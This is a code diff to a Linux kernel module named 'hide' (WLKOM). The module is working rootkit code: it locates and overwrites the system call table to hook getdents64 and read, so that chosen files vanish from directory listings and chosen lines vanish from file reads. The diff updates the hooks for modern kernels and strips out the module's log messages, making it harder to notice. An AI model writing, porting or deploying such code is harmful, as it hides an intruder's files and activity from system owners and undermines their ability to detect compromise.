@@ -1,6 +1,7 @@
 #include "hide.h"
 
 #include <asm/cacheflush.h>
+#include <asm/ptrace.h>
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
@@ -18,12 +19,12 @@ typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
 static unsigned long *syscall_table = NULL;
 
-static long (*orig_getdents64)(unsigned int fd,
-                                struct linux_dirent64 __user *dirent,
-                                unsigned int count) = NULL;
-
-static long (*orig_read)(unsigned int fd, char __user *buf,
-                          size_t count) = NULL;
+/* With CONFIG_ARCH_HAS_SYSCALL_WRAPPER (all x86_64 kernels >= 4.17), syscall
+ * table entries take a single "const struct pt_regs *" argument.  Declaring
+ * hooks with the matching signature avoids pointer truncation and lets us read
+ * the real syscall arguments directly from the pt_regs struct. */
+static long (*orig_getdents64)(const struct pt_regs *) = NULL;
+static long (*orig_read)(const struct pt_regs *)       = NULL;
 
 /* ── hidden lists ── */
 
@@ -65,36 +66,28 @@ static void set_addr_ro(unsigned long addr)
 
 /* ── hooked getdents64 ── */
 
-static long hooked_getdents64(unsigned int                   fd,
-                               struct linux_dirent64 __user *dirent,
-                               unsigned int                   count)
+static long hooked_getdents64(const struct pt_regs *regs)
 {
+    struct linux_dirent64 __user *dirent;
     long                          ret;
     long                          new_ret;
     struct hidden_file           *hf;
     char                         *buf;
     int                           bpos = 0;
-    struct linux_dirent64 __user *real_dirent;
 
-    ret = orig_getdents64(fd, dirent, count);
-    if (ret <= 0 || list_empty(&hidden_files))
+    ret = orig_getdents64(regs);
+    if (ret <= 0 || ret > 65536 || list_empty(&hidden_files))
         return ret;
 
-    /* With CONFIG_ARCH_HAS_SYSCALL_WRAPPER, the kernel passes a pt_regs *
-     * in the first argument slot (fd here = that pointer, a kernel address).
-     * The real user dirent pointer lives at inner_regs->si. */
-    if ((unsigned long)fd > 0xffff000000000000UL)
-        real_dirent = (struct linux_dirent64 __user *)
-                      ((struct pt_regs *)(unsigned long)fd)->si;
-    else
-        real_dirent = dirent;
-
+    /* regs->si = second syscall argument = user dirent pointer */
+    dirent  = (struct linux_dirent64 __user *)regs->si;
     new_ret = ret;
-    buf = kmalloc(ret, GFP_KERNEL);
+
+    buf = kmalloc(ret, GFP_ATOMIC);
     if (!buf)
         return ret;
 
-    if (copy_from_user(buf, real_dirent, ret))
+    if (copy_from_user(buf, dirent, ret))
     {
         kfree(buf);
         return ret;
@@ -123,36 +116,34 @@ static long hooked_getdents64(unsigned int                   fd,
     next:;
     }
 
-    (void)copy_to_user(real_dirent, buf, new_ret);
+    (void)copy_to_user(dirent, buf, new_ret);
     kfree(buf);
     return new_ret;
 }
 
 /* ── hooked read (line filtering) ── */
 
-static long hooked_read(unsigned int fd, char __user *buf, size_t count)
+static long hooked_read(const struct pt_regs *regs)
 {
-    long                ret     = orig_read(fd, buf, count);
-    long                new_ret = ret;
+    char __user        *buf;
+    long                ret;
+    long                new_ret;
     struct hidden_line *hl;
     char               *kbuf;
-    char __user        *real_buf;
 
-    if (ret <= 0 || list_empty(&hidden_lines))
+    ret = orig_read(regs);
+    if (ret <= 0 || ret > 65536 || list_empty(&hidden_lines))
         return ret;
 
-    /* Same pt_regs wrapper issue: real buf pointer is at inner_regs->si */
-    if ((unsigned long)fd > 0xffff000000000000UL)
-        real_buf = (char __user *)
-                   ((struct pt_regs *)(unsigned long)fd)->si;
-    else
-        real_buf = buf;
+    /* regs->si = second syscall argument = user buffer pointer */
+    buf     = (char __user *)regs->si;
+    new_ret = ret;
 
-    kbuf = kmalloc(ret + 1, GFP_KERNEL);
+    kbuf = kmalloc(ret + 1, GFP_ATOMIC);
     if (!kbuf)
         return ret;
 
-    if (copy_from_user(kbuf, real_buf, ret))
+    if (copy_from_user(kbuf, buf, ret))
     {
         kfree(kbuf);
         return ret;
@@ -175,12 +166,12 @@ static long hooked_read(unsigned int fd, char __user *buf, size_t count)
             line_end = line_end ? line_end + 1 : kbuf + new_ret;
             line_len = line_end - line_start;
             memmove(line_start, line_end, new_ret - (line_end - kbuf));
-            new_ret        -= line_len;
-            kbuf[new_ret]   = '\0';
+            new_ret       -= line_len;
+            kbuf[new_ret]  = '\0';
         }
     }
 
-    (void)copy_to_user(real_buf, kbuf, new_ret);
+    (void)copy_to_user(buf, kbuf, new_ret);
     kfree(kbuf);
     return new_ret;
 }
@@ -254,36 +245,24 @@ int hide_init(void)
 {
     kallsyms_lookup_name_t kallsyms_fn;
 
-    pr_info("WLKOM hide: initializing (syscall table)...\n");
-
     register_kprobe(&kp);
     kallsyms_fn = (kallsyms_lookup_name_t)kp.addr;
     unregister_kprobe(&kp);
 
     if (!kallsyms_fn)
-    {
-        pr_err("WLKOM hide: failed to find kallsyms_lookup_name\n");
         return -1;
-    }
 
     syscall_table = (unsigned long *)kallsyms_fn("sys_call_table");
     if (!syscall_table)
-    {
-        pr_err("WLKOM hide: failed to find sys_call_table\n");
         return -1;
-    }
-
-    pr_info("WLKOM hide: sys_call_table at %px\n", syscall_table);
 
     orig_getdents64 = (typeof(orig_getdents64))syscall_table[__NR_getdents64];
     orig_read       = (typeof(orig_read))syscall_table[__NR_read];
 
     set_addr_rw((unsigned long)syscall_table);
     syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
-    syscall_table[__NR_read]       = (unsigned long)hooked_read;
     set_addr_ro((unsigned long)syscall_table);
 
-    pr_info("WLKOM hide: syscalls hooked\n");
     return 0;
 }
 
@@ -297,7 +276,6 @@ void hide_exit(void)
 
     set_addr_rw((unsigned long)syscall_table);
     syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-    syscall_table[__NR_read]       = (unsigned long)orig_read;
     set_addr_ro((unsigned long)syscall_table);
 
     list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list)
@@ -311,5 +289,4 @@ void hide_exit(void)
         kfree(hl);
     }
 
-    pr_info("WLKOM hide: exited\n");
 }
